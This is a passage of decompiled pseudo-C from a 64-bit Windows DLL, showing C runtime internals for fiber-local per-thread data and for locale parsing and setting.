    "  int v8; // [rsp+68h] [rbp+28h] BYREF",
    "",
    "  v3 = a1;",
    "  v4 = &v3;",
    "  v7 = 5;",
    "  v8 = 5;",
    "  v5 = &v3;",
    "  v1 = 4;",
    "  v2 = 4;",
    "  if ( *a1 != (XSAVE_FORMAT *)&unk_18003D330 )",
    "  {",
    "    sub_180023374(*a1);",
    "    a1 = v3;",
    "  }",
    "  sub_180023374(a1[14]);",
    "  sub_180023374(v3[11]);",
    "  sub_180023374(v3[12]);",
    "  sub_180023374(v3[13]);",
    "  sub_180023374(v3[9]);",
    "  sub_180023374(v3[10]);",
    "  sub_180023374(v3[15]);",
    "  sub_180023374(v3[16]);",
    "  sub_180023374(v3[120]);",
    "  sub_180026008((__int64)&v6, &v8, (__int64)&v4, &v7);",
    "  sub_180025F80((__int64)&v6, &v2, &v5, &v1);",
    "}",
    "",
    "",
    "wchar_t **__fastcall sub_180026250(__int64 a1, __int64 a2)",
    "{",
    "  wchar_t **result; // rax",
    "  __int64 v5; // rcx",
    "",
    "  if ( *(_QWORD *)(a1 + 144) )",
    "  {",
    "    result = (wchar_t **)sub_18002E82C();",
    "    v5 = *(_QWORD *)(a1 + 144);",
    "    if ( v5 != qword_18004DCA0[0] )",
    "    {",
    "      result = &off_18004B340;",
    "      if ( (wchar_t **)v5 != &off_18004B340 && !*(_DWORD *)(v5 + 16) )",
    "        result = (wchar_t **)sub_18002E62C();",
    "    }",
    "  }",
    "  *(_QWORD *)(a1 + 144) = a2;",
    "  if ( a2 )",
    "    return (wchar_t **)sub_18002E5A0(a2);",
    "  return result;",
    "}",
    "",
    "",
    "void sub_1800262B8()",
    "{",
    "  XSAVE_FORMAT **Value; // rbx",
    "",
    "  if ( dwFlsIndex != -1 )",
    "  {",
    "    Value = (XSAVE_FORMAT **)FlsGetValue(dwFlsIndex);",
    "    if ( Value )",
    "    {",
    "      FlsSetValue(dwFlsIndex, 0);",
    "      sub_180026158(Value);",
    "      sub_180023374((XSAVE_FORMAT *)Value);",
    "    }",
    "  }",
    "}",
    "",
    "",
    "__int64 sub_1800262FC()",
    "{",
    "  DWORD LastError; // eax",
    "  DWORD v1; // ecx",
    "  DWORD v2; // ebx",
    "  PVOID Value; // rax",
    "  __int64 v4; // rdi",
    "  void *v5; // rax",
    "  XSAVE_FORMAT *v6; // rcx",
    "",
    "  LastError = GetLastError();",
    "  v1 = dwFlsIndex;",
    "  v2 = LastError;",
    "  if ( dwFlsIndex == -1 )",
    "  {",
    "LABEL_7:",
    "    if ( FlsSetValue(v1, (PVOID)0xFFFFFFFFFFFFFFFFLL) )",
    "    {",
    "      v5 = sub_1800232FC(1u, 0x3C8u);",
    "      v4 = (__int64)v5;",
    "      if ( v5 )",
    "      {",
    "        if ( FlsSetValue(dwFlsIndex, v5) )",
    "        {",
    "          sub_180026068(v4);",
    "          sub_180023374(0);",
    "          goto LABEL_15;",
    "        }",
    "        FlsSetValue(dwFlsIndex, 0);",
    "        v6 = (XSAVE_FORMAT *)v4;",
    "      }",
    "      else",
    "      {",
    "        FlsSetValue(dwFlsIndex, 0);",
    "        v6 = 0;",
    "      }",
    "      sub_180023374(v6);",
    "    }",
    "    v4 = 0;",
    "    goto LABEL_15;",
    "  }",
    "  Value = FlsGetValue(dwFlsIndex);",
    "  v4 = (__int64)Value;",
    "  if ( !Value )",
    "  {",
    "    v1 = dwFlsIndex;",
    "    goto LABEL_7;",
    "  }",
    "  if ( Value == (PVOID)-1LL )",
    "    v4 = 0;",
    "LABEL_15:",
    "  SetLastError(v2);",
    "  if ( !v4 )",
    "    sub_1800219B0();",
    "  return v4;",
    "}",
    "",
    "",
    "__int64 sub_1800263D0()",
    "{",
    "  DWORD v0; // ecx",
    "  PVOID Value; // rax",
    "  __int64 v2; // rbx",
    "  void *v3; // rax",
    "  XSAVE_FORMAT *v4; // rcx",
    "",
    "  v0 = dwFlsIndex;",
    "  if ( dwFlsIndex != -1 )",
    "  {",
    "    Value = FlsGetValue(dwFlsIndex);",
    "    v2 = (__int64)Value;",
    "    if ( Value )",
    "    {",
    "      if ( Value != (PVOID)-1LL )",
    "        return v2;",
    "LABEL_14:",
    "      sub_1800219B0();",
    "    }",
    "    v0 = dwFlsIndex;",
    "  }",
    "  if ( !FlsSetValue(v0, (PVOID)0xFFFFFFFFFFFFFFFFLL) )",
    "    goto LABEL_14;",
    "  v3 = sub_1800232FC(1u, 0x3C8u);",
    "  v2 = (__int64)v3;",
    "  if ( !v3 )",
    "  {",
    "    FlsSetValue(dwFlsIndex, 0);",
    "    v4 = 0;",
    "LABEL_9:",
    "    sub_180023374(v4);",
    "    goto LABEL_14;",
    "  }",
    "  if ( !FlsSetValue(dwFlsIndex, v3) )",
    "  {",
    "    FlsSetValue(dwFlsIndex, 0);",
    "    v4 = (XSAVE_FORMAT *)v2;",
    "    goto LABEL_9;",
    "  }",
    "  sub_180026068(v2);",
    "  sub_180023374(0);",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 sub_180026474()",
    "{",
    "  DWORD LastError; // eax",
    "  DWORD v1; // ecx",
    "  DWORD v2; // ebx",
    "  PVOID Value; // rax",
    "  __int64 v4; // rdi",
    "  void *v5; // rax",
    "  XSAVE_FORMAT *v6; // rcx",
    "",
    "  LastError = GetLastError();",
    "  v1 = dwFlsIndex;",
    "  v2 = LastError;",
    "  if ( dwFlsIndex != -1 )",
    "  {",
    "    Value = FlsGetValue(dwFlsIndex);",
    "    v4 = (__int64)Value;",
    "    if ( Value )",
    "    {",
    "      if ( Value == (PVOID)-1LL )",
    "        v4 = 0;",
    "      goto LABEL_15;",
    "    }",
    "    v1 = dwFlsIndex;",
    "  }",
    "  if ( FlsSetValue(v1, (PVOID)0xFFFFFFFFFFFFFFFFLL) )",
    "  {",
    "    v5 = sub_1800232FC(1u, 0x3C8u);",
    "    v4 = (__int64)v5;",
    "    if ( v5 )",
    "    {",
    "      if ( FlsSetValue(dwFlsIndex, v5) )",
    "      {",
    "        sub_180026068(v4);",
    "        sub_180023374(0);",
    "        goto LABEL_15;",
    "      }",
    "      FlsSetValue(dwFlsIndex, 0);",
    "      v6 = (XSAVE_FORMAT *)v4;",
    "    }",
    "    else",
    "    {",
    "      FlsSetValue(dwFlsIndex, 0);",
    "      v6 = 0;",
    "    }",
    "    sub_180023374(v6);",
    "  }",
    "  v4 = 0;",
    "LABEL_15:",
    "  SetLastError(v2);",
    "  return v4;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002653C(__int64 a1, __int64 a2)",
    "{",
    "  DWORD v2; // ecx",
    "  __int64 v3; // rbx",
    "  PVOID Value; // rax",
    "  __int64 v6; // rdi",
    "  void *v7; // rax",
    "  XSAVE_FORMAT *v8; // rcx",
    "",
    "  v2 = dwFlsIndex;",
    "  v3 = 0;",
    "  if ( dwFlsIndex != -1 )",
    "  {",
    "    Value = FlsGetValue(dwFlsIndex);",
    "    v6 = (__int64)Value;",
    "    if ( Value )",
    "    {",
    "      if ( Value != (PVOID)-1LL )",
    "        return v6 + 968 * a2;",
    "      return v3;",
    "    }",
    "    v2 = dwFlsIndex;",
    "  }",
    "  if ( FlsSetValue(v2, (PVOID)0xFFFFFFFFFFFFFFFFLL) )",
    "  {",
    "    v7 = sub_1800232FC(1u, 0x3C8u);",
    "    v6 = (__int64)v7;",
    "    if ( v7 )",
    "    {",
    "      if ( FlsSetValue(dwFlsIndex, v7) )",
    "      {",
    "        sub_180026068(v6);",
    "        sub_180023374(0);",
    "        return v6 + 968 * a2;",
    "      }",
    "      FlsSetValue(dwFlsIndex, 0);",
    "      v8 = (XSAVE_FORMAT *)v6;",
    "    }",
    "    else",
    "    {",
    "      FlsSetValue(dwFlsIndex, 0);",
    "      v8 = 0;",
    "    }",
    "    sub_180023374(v8);",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "char sub_1800265FC()",
    "{",
    "  dwFlsIndex = FlsAlloc((PFLS_CALLBACK_FUNCTION)Concurrency::details::SchedulerProxy::DeleteThis);",
    "  if ( dwFlsIndex == -1 )",
    "    return 0;",
    "  if ( !sub_180026474() )",
    "  {",
    "    sub_180026638(0);",
    "    return 0;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char sub_180026638()",
    "{",
    "  if ( dwFlsIndex != -1 )",
    "  {",
    "    FlsFree(dwFlsIndex);",
    "    dwFlsIndex = -1;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "void __fastcall sub_18002665C(__int64 a1, int *a2, _QWORD **a3, int *a4)",
    "{",
    "  __int64 v6; // rax",
    "  void *v7; // rcx",
    "  char *v8; // r8",
    "  int v9; // edx",
    "  int v10; // eax",
    "  _QWORD *v11; // rax",
    "",
    "  sub_1800209E8(*a2);",
    "  sub_180026C08(**a3, *(_QWORD *)(*a3[1] + 144LL));",
    "  v6 = sub_180027440(**a3, *(unsigned int *)a3[3], *a3[4]);",
    "  *a3[2] = v6;",
    "  if ( v6 )",
    "  {",
    "    v7 = (void *)*a3[4];",
    "    if ( v7 )",
    "    {",
    "      v8 = (char *)(&unk_18004B4A8 - (_UNKNOWN *)v7);",
    "      do",
    "      {",
    "        v9 = *(unsigned __int16 *)&v8[(_QWORD)v7];",
    "        v10 = *(unsigned __int16 *)v7 - v9;",
    "        if ( v10 )",
    "          break;",
    "        v7 = (char *)v7 + 2;",
    "      }",
    "      while ( v9 );",
    "      if ( v10 )",
    "        _InterlockedExchange(&dword_18004DC98, 1);",
    "    }",
    "    sub_18002E944(*a3[1] + 144LL, **a3);",
    "    sub_18002E82C(**a3);",
    "    v11 = a3[1];",
    "    if ( (*(_BYTE *)(*v11 + 936LL) & 2) == 0 && (dword_18004B5B0 & 1) == 0 )",
    "    {",
    "      sub_18002E944(qword_18004DCA0, *(_QWORD *)(*v11 + 144LL));",
    "      off_18004B2A8 = *(_UNKNOWN ***)(qword_18004DCA0[0] + 248);",
    "      off_18004B2C0 = *(wchar_t **)qword_18004DCA0[0];",
    "      dword_18004B4AC = *(_DWORD *)(qword_18004DCA0[0] + 8);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    sub_18002E82C(**a3);",
    "    sub_18002E62C(**a3);",
    "  }",
    "  sub_180020A3C(*a4);",
    "}",
    "",
    "",
    "void __fastcall sub_180026798(__int64 a1, int *a2, __int64 a3, int *a4)",
    "{",
    "  __int64 *i; // rbx",
    "",
    "  sub_1800209E8(*a2);",
    "  for ( i = qword_18004DCA0; i != &qword_18004DCA8; ++i )",
    "  {",
    "    if ( (wchar_t **)*i != &off_18004B340 )",
    "      *i = sub_18002E944(i, &off_18004B340);",
    "  }",
    "  sub_180020A3C(*a4);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180026808(__int64 a1, __int64 a2, __int64 a3, __int64 *a4)",
    "{",
    "  __int64 result; // rax",
    "",
    "  sub_180026834(a3);",
    "  result = *a4;",
    "  *(_DWORD *)(*(_QWORD *)*a4 + 936LL) &= ~0x10u;",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall sub_180026834(_QWORD **a1)",
    "{",
    "  LPVOID v2; // rbx",
    "  _QWORD *v3[7]; // [rsp+20h] [rbp-38h] BYREF",
    "  char v4; // [rsp+60h] [rbp+8h] BYREF",
    "  int v5; // [rsp+68h] [rbp+10h] BYREF",
    "  int v6; // [rsp+70h] [rbp+18h] BYREF",
    "",
    "  v2 = sub_1800232FC(1u, 0x158u);",
    "  **a1 = v2;",
    "  sub_180023374(0);",
    "  if ( v2 )",
    "  {",
    "    v3[0] = *a1;",
    "    v3[1] = a1[1];",
    "    v3[2] = a1[2];",
    "    v3[3] = a1[3];",
    "    v3[4] = a1[4];",
    "    v5 = 4;",
    "    v6 = 4;",
    "    sub_18002665C((__int64)&v4, &v6, v3, &v5);",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800268C4(__int64 a1, __int64 a2, __int64 a3)",
    "{",
    "  __int64 result; // rax",
    "",
    "  if ( (unsigned int)sub_18003110C(*(_QWORD *)(a1 + 16) + 600LL, 85, a2, a3)",
    "    || (result = sub_18003110C(*(_QWORD *)a1, *(_QWORD *)(a1 + 8), a2, a3), (_DWORD)result) )",
    "  {",
    "    sub_18001A6B4();",
    "    JUMPOUT(0x18002693ALL);",
    "  }",
    "  *(_BYTE *)(a1 + 24) = 1;",
    "  return result;",
    "}",
    "",
    "",
    "LPVOID __fastcall sub_18002693C(__m128i *a1)",
    "{",
    "  unsigned __int64 v2; // rax",
    "  unsigned __int64 v3; // rsi",
    "  LPVOID v4; // rax",
    "  LPVOID v5; // rbx",
    "",
    "  if ( !a1 )",
    "    return 0;",
    "  v2 = sub_180021E08(a1, 0x55u);",
    "  v3 = v2;",
    "  if ( v2 >= 0x55 )",
    "    return 0;",
    "  v4 = sub_180024B50(2 * v2 + 2);",
    "  v5 = v4;",
    "  if ( !v4 )",
    "    return 0;",
    "  if ( (unsigned int)sub_18003110C(v4, v3 + 1, a1, v3 + 1) )",
    "  {",
    "    sub_18001A6B4();",
    "    JUMPOUT(0x1800269BDLL);",
    "  }",
    "  return v5;",
    "}",
    "",
    "",
    "void sub_1800269CC()",
    "{",
    "  __int64 v0; // [rsp+30h] [rbp+8h] BYREF",
    "  int v1; // [rsp+38h] [rbp+10h] BYREF",
    "  int v2; // [rsp+40h] [rbp+18h] BYREF",
    "",
    "  v1 = 4;",
    "  v2 = 4;",
    "  sub_180026798((__int64)&v0, &v2, (__int64)&v0, &v1);",
    "}",
    "",
    "",
    "__int64 __fastcall _lc_lctowcs(__int64 a1, __int64 a2, __int64 a3)",
    "{",
    "  __int64 result; // rax",
    "",
    "  if ( (unsigned int)sub_18002BA78(a1, a2, a3) )",
    "  {",
    "    sub_18001A6B4();",
    "    JUMPOUT(0x180026A9DLL);",
    "  }",
    "  if ( *(_WORD *)(a3 + 128) )",
    "    sub_180027148(a1, a2, 2, L\"_\", a3 + 128);",
    "  result = a3 + 256;",
    "  if ( *(_WORD *)(a3 + 256) )",
    "    return sub_180027148(a1, a2, 2, L\".\", a3 + 256);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180026AA0(__int64 a1, _WORD *a2)",
    "{",
    "  int i; // edi",
    "  unsigned __int64 v6; // rax",
    "  __int16 *v7; // r14",
    "  __int16 v8; // si",
    "  __int64 v9; // rcx",
    "  __int64 v10; // rdx",
    "",
    "  sub_1800368A0(a1, 0, 458);",
    "  if ( !*a2 )",
    "    return 0;",
    "  if ( *a2 == 46 && a2[1] )",
    "  {",
    "    if ( (unsigned int)sub_18003110C(a1 + 256, 16, a2 + 1, 15) )",
    "    {",
    "LABEL_27:",
    "      sub_18001A6B4();",
    "      JUMPOUT(0x180026C05LL);",
    "    }",
    "    *(_WORD *)(a1 + 286) = 0;",
    "    return 0;",
    "  }",
    "  for ( i = 0; ; ++i )",
    "  {",
    "    v6 = sub_180031208(a2, L\"_.,\");",
    "    if ( !v6 )",
    "      break;",
    "    v7 = &a2[v6];",
    "    v8 = *v7;",
    "    if ( i )",
    "    {",
    "      if ( i == 1 )",
    "      {",
    "        if ( v6 >= 0x40 || v8 == 95 )",
    "          return 0xFFFFFFFFLL;",
    "        v9 = a1 + 128;",
    "        v10 = 64;",
    "      }",
    "      else",
    "      {",
    "        if ( i != 2 || v6 >= 0x10 || v8 && v8 != 44 )",
    "          return 0xFFFFFFFFLL;",
    "        v9 = a1 + 256;",
    "        v10 = 16;",
    "      }",
    "      if ( (unsigned int)sub_18003110C(v9, v10, a2, v6) )",
    "        goto LABEL_27;",
    "    }",
    "    else",
    "    {",
    "      if ( v6 >= 0x40 )",
    "        return 0xFFFFFFFFLL;",
    "      if ( (unsigned int)sub_18003110C(a1, 64, a2, v6) )",
    "        goto LABEL_27;",
    "      i = v8 == 46;",
    "    }",
    "    if ( v8 == 44 || !v8 )",
    "      return 0;",
    "    a2 = v7 + 1;",
    "  }",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "void __fastcall sub_180026C08(__int64 a1, _OWORD *a2)",
    "{",
    "  __int64 v2; // rax",
    "  _OWORD *v3; // r8",
    "  __int128 v4; // xmm1",
    "",
    "  if ( a2 && a1 && (_OWORD *)a1 != a2 )",
    "  {",
    "    v2 = 2;",
    "    v3 = (_OWORD *)a1;",
    "    do",
    "    {",
    "      *v3 = *a2;",
    "      v3[1] = a2[1];",
    "      v3[2] = a2[2];",
    "      v3[3] = a2[3];",
    "      v3[4] = a2[4];",
    "      v3[5] = a2[5];",
    "      v3[6] = a2[6];",
    "      v3 += 8;",
    "      v4 = a2[7];",
    "      a2 += 8;",
    "      *(v3 - 1) = v4;",
    "      --v2;",
    "    }",
    "    while ( v2 );",
    "    *v3 = *a2;",
    "    v3[1] = a2[1];",
    "    v3[2] = a2[2];",
    "    v3[3] = a2[3];",
    "    v3[4] = a2[4];",
    "    *((_QWORD *)v3 + 10) = *((_QWORD *)a2 + 10);",
    "    *(_DWORD *)(a1 + 16) = 0;",
    "    sub_18002E5A0(a1);",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180026CC8(char *a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, _DWORD *a6)",
    "{",
    "  __int64 v10; // rax",
    "  char v11; // r14",
    "  __int64 v12; // r12",
    "  __int64 v13; // rsi",
    "  unsigned __int64 v14; // r15",
    "  int v15; // edi",
    "  unsigned __int16 *v16; // rax",
    "  int v17; // edx",
    "  int v18; // ecx",
    "  unsigned __int16 *v19; // rax",
    "  int v20; // edx",
    "  int v21; // ecx",
    "  bool v22; // zf",
    "  _DWORD *v23; // rdi",
    "  int v24; // eax",
    "  unsigned __int64 v25; // rdi",
    "  unsigned __int16 v26; // ax",
    "  __int64 v27; // r8",
    "  char *v28; // rdx",
    "  int v29; // edx",
    "  int v30; // ecx",
    "  int v31; // ecx",
    "  unsigned __int16 v32; // ax",
    "  __int64 v33; // rdx",
    "  __int64 v34; // [rsp+30h] [rbp-D0h] BYREF",
    "  _DWORD *v35; // [rsp+38h] [rbp-C8h]",
    "  char *v36; // [rsp+40h] [rbp-C0h]",
    "  __int64 v37; // [rsp+48h] [rbp-B8h] BYREF",
    "  __int64 v38; // [rsp+50h] [rbp-B0h]",
    "  __int64 v39; // [rsp+58h] [rbp-A8h]",
    "  char v40; // [rsp+60h] [rbp-A0h]",
    "  _DWORD *v41; // [rsp+68h] [rbp-98h]",
    "  __int64 v42; // [rsp+70h] [rbp-90h]",
    "  __int64 v43; // [rsp+78h] [rbp-88h]",
    "  _BYTE v44[256]; // [rsp+80h] [rbp-80h] BYREF",
    "  unsigned __int16 v45; // [rsp+180h] [rbp+80h]",
    "  unsigned __int16 v46; // [rsp+182h] [rbp+82h]",
    "  unsigned __int16 v47; // [rsp+184h] [rbp+84h]",
    "  __int16 v48; // [rsp+186h] [rbp+86h]",
    "  __int64 v49; // [rsp+188h] [rbp+88h]",
    "  _WORD v50[88]; // [rsp+1A0h] [rbp+A0h] BYREF",
    "",
    "  v42 = a3;",
    "  v43 = a2;",
    "  v34 = a5;",
    "  v41 = a6;",
    "  if ( !a1 )",
    "    return 0;",
    "  if ( *(_WORD *)a1 == 67 && !*((_WORD *)a1 + 1) )",
    "  {",
    "    if ( !(unsigned int)sub_18002BA78(a2, a3, L\"C\") )",
    "    {",
    "      *a6 = 0;",
    "      return a2;",
    "    }",
    "LABEL_68:",
    "    sub_18001A6B4();",
    "    __debugbreak();",
    "  }",
    "  v10 = sub_1800262FC();",
    "  v37 = a4;",
    "  v38 = a5;",
    "  v39 = v10 + 152;",
    "  v11 = 0;",
    "  v40 = 0;",
    "  v35 = (_DWORD *)(v10 + 184);",
    "  v36 = (char *)(v10 + 188);",
    "  v12 = v10 + 450;",
    "  if ( (unsigned int)sub_18003110C(a4, a5, v10 + 752, 85) )",
    "    goto LABEL_68;",
    "  v13 = -1;",
    "  v14 = -1;",
    "  v15 = 0;",
    "  do",
    "    ++v14;",
    "  while ( *(_WORD *)&a1[2 * v14] );",
    "  if ( v14 < 0x83 )",
    "  {",
    "    v16 = (unsigned __int16 *)v12;",
    "    do",
    "    {",
    "      v17 = *(unsigned __int16 *)&a1[(_QWORD)v16 - v12];",
    "      v18 = *v16 - v17;",
    "      if ( v18 )",
    "        break;",
    "      ++v16;",
    "    }",
    "    while ( v17 );",
    "    if ( !v18 )",
    "      goto LABEL_67;",
    "    v19 = (unsigned __int16 *)v36;",
    "    do",
    "    {",
    "      v20 = *(unsigned __int16 *)((char *)v19 + a1 - v36);",
    "      v21 = *v19 - v20;",
    "      if ( v21 )",
    "        break;",
    "      ++v19;",
    "    }",
    "    while ( v20 );",
    "    if ( !v21 )",
    "      goto LABEL_67;",
    "  }",
    "  LOBYTE(v15) = !sub_180023B1C();",
    "  if ( (unsigned int)sub_180026AA0((__int64)v44, a1) )",
    "  {",
    "    v23 = v35;",
    "    goto LABEL_29;",
    "  }",
    "  v22 = v15 == 0;",
    "  v23 = v35;",
    "  if ( v22 )",
    "    v24 = sub_180031A1C(v44, v35, v44);",
    "  else",
    "    v24 = sub_180032464(v44, v35, v44);",
    "  if ( !v24 )",
    "  {",
    "LABEL_29:",
    "    if ( sub_1800238E8((__int64)a1) )",
    "    {",
    "      LODWORD(v34) = 0;",
    "      if ( !sub_18002377C((__int64)a1, 0x20001004u, (WCHAR *)&v34, 2u) || (v26 = v34, !(_DWORD)v34) )",
    "        v26 = -535;",
    "      *v23 = v26;",
    "      v25 = v14 + 1;",
    "      if ( (unsigned int)sub_18003110C(v12, 131, a1, v14 + 1) )",
    "        goto LABEL_69;",
    "      v27 = v14 + 1;",
    "      v28 = a1;",
    "      goto LABEL_61;",
    "    }",
    "    if ( !(unsigned __int8)sub_180027A1C(v44, a1) || !sub_1800238E8((__int64)v50) )",
    "    {",
    "LABEL_51:",
    "      v12 = 0;",
    "      goto LABEL_52;",
    "    }",
    "    if ( v45 )",
    "    {",
    "      v29 = v45 + 32;",
    "      if ( (unsigned int)v45 - 65 > 0x19 )",
    "        v29 = v45;",
    "      if ( v29 != 117 )",
    "        goto LABEL_50;",
    "      v30 = v46 + 32;",
    "      if ( (unsigned int)v46 - 65 > 0x19 )",
    "        v30 = v46;",
    "      if ( v30 != 116 )",
    "        goto LABEL_50;",
    "      v31 = v47 + 32;",
    "      if ( (unsigned int)v47 - 65 > 0x19 )",
    "        v31 = v47;",
    "      if ( v31 != 102 || v48 != 56 || (_WORD)v49 )",
    "      {",
    "LABEL_50:",
    "        if ( v48 != 45 || (_DWORD)v49 != 56 )",
    "          goto LABEL_51;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      LODWORD(v34) = 0;",
    "      if ( sub_18002377C((__int64)v50, 0x20001004u, (WCHAR *)&v34, 2u) )",
    "      {",
    "        v32 = v34;",
    "        if ( (_DWORD)v34 )",
    "          goto LABEL_58;",
    "      }",
    "    }",
    "    v32 = -535;",
    "LABEL_58:",
    "    *v23 = v32;",
    "    v25 = v14 + 1;",
    "    if ( (unsigned int)sub_18003110C(v12, 131, a1, v14 + 1) )",
    "      goto LABEL_69;",
    "    do",
    "      ++v13;",
    "    while ( v50[v13] );",
    "    v28 = (char *)v50;",
    "    v27 = v13 + 1;",
    "LABEL_61:",
    "    sub_1800268C4((__int64)&v37, (__int64)v28, v27);",
    "    v11 = v40;",
    "    goto LABEL_62;",
    "  }",
    "  _lc_lctowcs(v12, 131, (__int64)v44);",
    "  do",
    "    ++v13;",
    "  while ( v50[v13] );",
    "  v11 = 1;",
    "  if ( (unsigned int)sub_18003110C(a4, v34, v50, v13 + 1) )",
    "    goto LABEL_69;",
    "  v25 = v14 + 1;",
    "LABEL_62:",
    "  if ( !*(_WORD *)a1 || v14 >= 0x83 )",
    "  {",
    "    *(_WORD *)v36 = 0;",
    "    goto LABEL_67;",
    "  }",
    "  if ( (unsigned int)sub_18003110C(v36, 131, a1, v25) )",
    "  {",
    "LABEL_69:",
    "    sub_18001A6B4();",
    "    JUMPOUT(0x180027144LL);",
    "  }",
    "LABEL_67:",
    "  v33 = v42;",
    "  *v41 = *v35;",
    "  if ( (unsigned int)sub_18002BA78(v43, v33, v12) )",
    "    goto LABEL_68;",
    "LABEL_52:",
    "  if ( !v11 && (unsigned int)sub_18003110C(v39 + 600, 85, v37, v38) )",
    "    goto LABEL_68;",
    "  return v12;",
    "}",
    "",
    "",
    "void __fastcall sub_180027148(__int64 a1, __int64 a2, int a3)",
    "{",
    "  int v3; // ebx",
    "  _QWORD *v4; // rdi",
    "  _QWORD v7[11]; // [rsp+0h] [rbp-58h] BYREF",
    "",
    "  if ( a3 > 0 )",
    "  {",
    "    v3 = 0;",
    "    v4 = &v7[14];",
    "    do",
    "    {",
    "      if ( (unsigned int)sub_180030F9C(a1, a2, *++v4) )",
    "      {",
    "        v7[4] = 0;",
    "        sub_18001A6B4();",
    "        JUMPOUT(0x1800271ACLL);",
    "      }",
    "      ++v3;",
    "    }",
    "    while ( v3 < a3 );",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800271B0(unsigned int a1, __int64 a2)",
    "{",
    "  __int64 v3; // [rsp+20h] [rbp-40h] BYREF",
    "  __int64 v4; // [rsp+28h] [rbp-38h] BYREF",
    "  __int64 *v5; // [rsp+30h] [rbp-30h] BYREF",
    "  _QWORD v6[5]; // [rsp+38h] [rbp-28h] BYREF",
    "  unsigned int v7; // [rsp+70h] [rbp+10h] BYREF",
    "  __int64 v8; // [rsp+78h] [rbp+18h] BYREF",
    "  char v9; // [rsp+80h] [rbp+20h] BYREF",
    "  __int64 v10; // [rsp+88h] [rbp+28h] BYREF",
    "",
    "  v8 = a2;",
    "  v7 = a1;",
    "  v3 = 0;",
    "  v4 = 0;",
    "  if ( a1 <= 5 )",
    "  {",
    "    v10 = sub_1800262FC();",
    "    sub_180023B4C();",
    "    sub_18002E8D4();",
    "    *(_DWORD *)(v10 + 936) |= 0x10u;",
    "    v5 = &v10;",
    "    v6[0] = &v4;",
    "    v6[1] = &v10;",
    "    v6[2] = &v3;",
    "    v6[3] = &v7;",
    "    v6[4] = &v8;",
    "    sub_180026808((__int64)&v9, (__int64)&v9, (__int64)v6, (__int64 *)&v5);",
    "    return v3;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 0;",
    "  }",
    "}",
    "",
    "",
    "XSAVE_FORMAT *__fastcall sub_180027254(__int64 a1)",
    "{",
    "  int v2; // edi",
    "  XSAVE_FORMAT *result; // rax",
    "  XSAVE_FORMAT *v4; // rsi",
    "  __int64 p_TagWord; // r14",
    "  char **v6; // r15",
    "  wchar_t **v7; // rbp",
    "  unsigned __int16 *v8; // rax",
    "  int v9; // ecx",
    "  int v10; // r8d",
    "  int v11; // eax",
    "  volatile signed __int32 *v12; // rcx",
    "  volatile signed __int32 *v13; // rdx",
    "  volatile signed __int32 *v14; // rcx",
    "  volatile signed __int32 *v15; // rcx",
    "",
    "  v2 = 1;",
    "  result = (XSAVE_FORMAT *)sub_180024B50(0x6A6u);",
    "  v4 = result;",
    "  if ( result )",
    "  {",
    "    p_TagWord = (__int64)&result->TagWord;",
    "    *(_DWORD *)&result->ControlWord = 1;",
    "    *(_WORD *)&result->TagWord = 0;",
    "    v6 = (char **)(a1 + 72);",
    "    sub_180027148((__int64)&result->TagWord, 849, 3);",
    "    v7 = &off_18003E0B8;",
    "    do",
    "    {",
    "      if ( (unsigned int)sub_180030F9C(p_TagWord, 849, L\";\") )",
    "      {",
    "        sub_18001A6B4();",
    "        JUMPOUT(0x18002743DLL);",
    "      }",
    "      v8 = (unsigned __int16 *)*v6;",
    "      do",
    "      {",
    "        v9 = *(unsigned __int16 *)((char *)v8 + v6[4] - *v6);",
    "        v10 = *v8 - v9;",
    "        if ( v10 )",
    "          break;",
    "        ++v8;",
    "      }",
    "      while ( v9 );",
    "      v11 = 0;",
    "      if ( !v10 )",
    "        v11 = v2;",
    "      v2 = v11;",
    "      v7 += 3;",
    "      v6 += 4;",
    "      sub_180027148(p_TagWord, 849, 3);",
    "    }",
    "    while ( (__int64)v7 < (__int64)&off_18003E118 );",
    "    if ( v2 )",
    "    {",
    "      sub_180023374(v4);",
    "      v14 = *(volatile signed __int32 **)(a1 + 56);",
    "      if ( v14 && _InterlockedExchangeAdd(v14, 0xFFFFFFFF) == 1 )",
    "        sub_180023374(*(XSAVE_FORMAT **)(a1 + 56));",
    "      v15 = *(volatile signed __int32 **)(a1 + 48);",
    "      if ( v15 && _InterlockedExchangeAdd(v15, 0xFFFFFFFF) == 1 )",
    "        sub_180023374(*(XSAVE_FORMAT **)(a1 + 48));",
    "      result = *(XSAVE_FORMAT **)(a1 + 104);",
    "      *(_QWORD *)(a1 + 48) = 0;",
    "      *(_QWORD *)(a1 + 32) = 0;",
    "      *(_QWORD *)(a1 + 56) = 0;",
    "      *(_QWORD *)(a1 + 40) = 0;",
    "    }",
    "    else",
    "    {",
    "      v12 = *(volatile signed __int32 **)(a1 + 56);",
    "      if ( v12 && _InterlockedExchangeAdd(v12, 0xFFFFFFFF) == 1 )",
    "        sub_180023374(*(XSAVE_FORMAT **)(a1 + 56));",
    "      v13 = *(volatile signed __int32 **)(a1 + 48);",
    "      if ( v13 )",
    "      {",
    "        if ( _InterlockedExchangeAdd(v13, 0xFFFFFFFF) == 1 )",
    "          sub_180023374(*(XSAVE_FORMAT **)(a1 + 48));",
    "      }",
    "      *(_QWORD *)(a1 + 48) = 0;",
    "      result = (XSAVE_FORMAT *)p_TagWord;",
    "      *(_QWORD *)(a1 + 32) = 0;",
    "      *(_QWORD *)(a1 + 56) = v4;",
    "      *(_QWORD *)(a1 + 40) = p_TagWord;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
